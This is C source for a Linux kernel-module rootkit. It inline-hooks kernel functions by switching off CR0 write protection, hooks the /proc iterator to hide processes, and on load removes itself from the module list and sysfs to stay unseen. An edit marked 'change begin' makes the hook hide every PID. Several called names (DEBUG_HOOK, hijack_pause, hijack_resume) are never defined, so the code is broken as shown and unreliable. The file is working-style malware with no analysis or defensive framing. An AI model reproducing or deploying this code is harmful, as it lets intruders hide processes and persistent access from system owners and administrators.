#include <linux/capability.h>
#include <linux/cred.h>
#include <asm/uaccess.h>
#include <linux/proc_fs.h>
#include <linux/in.h>
#include <linux/init.h>
#include <asm/cacheflush.h>
#include <linux/kallsyms.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/version.h>
#include <linux/unistd.h>
#include <linux/slab.h>
#include <linux/list.h>
#include <linux/fs.h>
#include <generated/autoconf.h>

#define __DEBUG__ 1  
#if __DEBUG__
# define DEBUG(fmt, ...) printk(fmt, ##__VA_ARGS__)
#else
# define DEBUG(fmt, ...)
#endif

#define INLINE_SIZE 12

struct sym_hook {
    void *addr;
    unsigned char o_code[INLINE_SIZE];
    unsigned char n_code[INLINE_SIZE];
    struct list_head list;
};

struct ksym {
    char *name;
    unsigned long addr;
};

LIST_HEAD(hooked_syms);

inline unsigned long disable_wp ( void )
{
    unsigned long cr0;

    preempt_disable();
    barrier();

    cr0 = read_cr0();
    write_cr0(cr0 & ~X86_CR0_WP);
    return cr0;
}

inline void restore_wp ( unsigned long cr0 )
{
    write_cr0(cr0);

    barrier();
    preempt_enable();
}

void rootkit_start ( void *target, void *new ){
    struct sym_hook *sa;
    unsigned char o_code[INLINE_SIZE], n_code[INLINE_SIZE];

    unsigned long o_cr0;
    // mov rax, $addr; jmp rax
    memcpy(n_code, "\x48\xb8\x00\x00\x00\x00\x00\x00\x00\x00\xff\xe0", INLINE_SIZE);
    *(unsigned long *)&n_code[2] = (unsigned long)new;


    DEBUG_HOOK("Hooking function 0x%p with 0x%p\n", target, new);

    memcpy(o_code, target, INLINE_SIZE);

    o_cr0 = disable_wp();
    memcpy(target, n_code, INLINE_SIZE);
    restore_wp(o_cr0);

    sa = kmalloc(sizeof(*sa), GFP_KERNEL);
    if ( ! sa )
        return;

    sa->addr = target;
    memcpy(sa->o_code, o_code, INLINE_SIZE);
    memcpy(sa->n_code, n_code, INLINE_SIZE);

    list_add(&sa->list, &hooked_syms);
}


void rootkit_pause ( void *target ){
    struct sym_hook *sa;

    DEBUG_HOOK("Pausing function hook 0x%p\n", target);

    list_for_each_entry ( sa, &hooked_syms, list )
    if ( target == sa->addr ){
        unsigned long o_cr0 = disable_wp();
        memcpy(target, sa->o_code, INLINE_SIZE);
        restore_wp(o_cr0);
    }
}

void rootkit_resume ( void *target ){
    struct sym_hook *sa;

    DEBUG_HOOK("Resuming function hook 0x%p\n", target);

    list_for_each_entry ( sa, &hooked_syms, list )
    if ( target == sa->addr ){
        unsigned long o_cr0 = disable_wp();
        memcpy(target, sa->n_code, INLINE_SIZE);
        restore_wp(o_cr0);
    }
}

void rootkit_stop ( void *target ){
    struct sym_hook *sa;

    DEBUG_HOOK("Unhooking function 0x%p\n", target);

    list_for_each_entry ( sa, &hooked_syms, list )
    if ( target == sa->addr ){
        unsigned long o_cr0 = disable_wp();
        memcpy(target, sa->o_code, INLINE_SIZE);
        restore_wp(o_cr0);

        list_del(&sa->list);
        kfree(sa);
        break;
    }
}

struct s_proc_args {
    unsigned short pid;
};

struct hidden_proc {
    unsigned short pid;
    struct list_head list;
};

LIST_HEAD(hidden_procs);

#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
static int (*proc_filldir)(void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type);
static int (*root_filldir)(void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type);
#else
static int (*proc_filldir)(struct dir_context *, const char *, int, loff_t, u64, unsigned);
static int (*root_filldir)(struct dir_context *, const char *, int, loff_t, u64, unsigned);
#endif

#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 11, 0)
static int (*proc_iterate)(struct file *file, void *dirent, filldir_t filldir);
static int (*root_iterate)(struct file *file, void *dirent, filldir_t filldir);
#define ITERATE_NAME readdir
#define ITERATE_PROTO struct file *file, void *dirent, filldir_t filldir
#define FILLDIR_VAR filldir
#define REPLACE_FILLDIR(ITERATE_FUNC, FILLDIR_FUNC) \
{                                                   \
    ret = ITERATE_FUNC(file, dirent, &FILLDIR_FUNC);\
}
#else
static int (*proc_iterate)(struct file *file, struct dir_context *);
static int (*root_iterate)(struct file *file, struct dir_context *);
#define ITERATE_NAME iterate
#define ITERATE_PROTO struct file *file, struct dir_context *ctx
#define FILLDIR_VAR ctx->actor
#define REPLACE_FILLDIR(ITERATE_FUNC, FILLDIR_FUNC) \
{                                                   \
    *((filldir_t *)&ctx->actor) = &FILLDIR_FUNC;    \
    ret = ITERATE_FUNC(file, ctx);                  \
}
#endif

void *get_vfs_iterate ( const char *path ){
    void *ret;
    struct file *filep;

    if ( (filep = filp_open(path, O_RDONLY, 0)) == NULL ){
        DEBUG("can't open the this file \n");
        return NULL;
    }

    ret = filep->f_op->ITERATE_NAME;

    filp_close(filep, 0);

    return ret;
}

void hide_proc ( unsigned short pid ){
    struct hidden_proc *hp;

    hp = kmalloc(sizeof(*hp), GFP_KERNEL);
    if ( ! hp )
        return;

    hp->pid = pid;

    list_add(&hp->list, &hidden_procs);
}

void unhide_proc ( unsigned short pid ){
    struct hidden_proc *hp;

    list_for_each_entry ( hp, &hidden_procs, list )
    {
        if ( pid == hp->pid )
        {
            list_del(&hp->list);
            kfree(hp);
            break;
        }
    }
}


#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
static int n_proc_filldir( void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type ){
    struct hidden_proc *hp;
    char *endp;
    long pid;

    pid = simple_strtol(name, &endp, 10);

    list_for_each_entry ( hp, &hidden_procs, list )
        //if ( pid == hp->pid )
        //    return 0;
        return 0;

    return proc_filldir(__buf, name, namelen, offset, ino, d_type);
}
#else
static int n_proc_filldir( struct dir_context *npf_ctx, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type ){
    struct hidden_proc *hp;
    char *endp;
    long pid;

    pid = simple_strtol(name, &endp, 10);

    list_for_each_entry ( hp, &hidden_procs, list )
        /********source begin*********/
        //if ( pid == hp->pid )
        //    return 0;
        /*********source end********////////
        // to delete all pid!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
        ///////change begin
        return 0;
        ///////change end

    return proc_filldir(npf_ctx, name, namelen, offset, ino, d_type);
}
#endif

int n_proc_iterate ( ITERATE_PROTO )
{
    int ret;

    proc_filldir = FILLDIR_VAR;

    hijack_pause(proc_iterate);
    REPLACE_FILLDIR(proc_iterate, n_proc_filldir);
    hijack_resume(proc_iterate);

    return ret;
}

void exec_hide_proc(unsigned short pid){
	DEBUG("Hiding PID %hu\n", pid);
	hide_proc(pid);
}

void exec_unhide_proc(unsigned short pid){
	DEBUG("Unhiding PID %hu\n", pid);
	unhide_proc(pid);
}

static int __init init_module ( void ){
    DEBUG("begin the init function\n");
    // Hide LKM and all symbols
    list_del_init(&__this_module.list);

    // Hide LKM from sysfs 
    kobject_del(__this_module.holders_dir->parent);

    //ia32_sys_call_table = find_ia32_sys_call_table();
    //DEBUG("ia32_sys_call_table obtained at %p\n", ia32_sys_call_table);

    //sys_call_table = find_sys_call_table();
    //DEBUG("sys_call_table obtained at %p\n", sys_call_table);

    // Hook /proc for hiding processes
    proc_iterate = get_vfs_iterate("/proc");
    rootkit_start(proc_iterate, &n_proc_iterate);

	exec_hide_proc(1);
    // Hook / for hiding files and directories
    //root_iterate = get_vfs_iterate("/");
    //rootkit_start(root_iterate, &n_root_iterate);


    return 0;
}

static void __exit quit_module ( void ){
    //rootkit_stop(root_iterate);
	exec_unhide_proc(1);
    rootkit_stop(proc_iterate);

}

module_init(init_module);
module_exit(quit_module);

MODULE_LICENSE("GPL");